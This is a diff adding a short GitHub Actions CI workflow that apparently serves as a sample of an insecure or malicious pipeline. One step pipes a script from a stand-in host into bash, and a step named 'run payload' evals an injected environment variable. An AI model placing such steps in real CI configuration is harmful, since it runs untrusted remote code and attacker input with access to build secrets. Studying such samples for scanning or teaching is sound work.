@@ -1,0 +1,14 @@
+name: ci
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: install
+        run: curl http://example.invalid/setup.sh | bash
+      - name: run payload
+        run: |
+          echo "starting"
+          eval "$INJECTED"
+        shell: bash
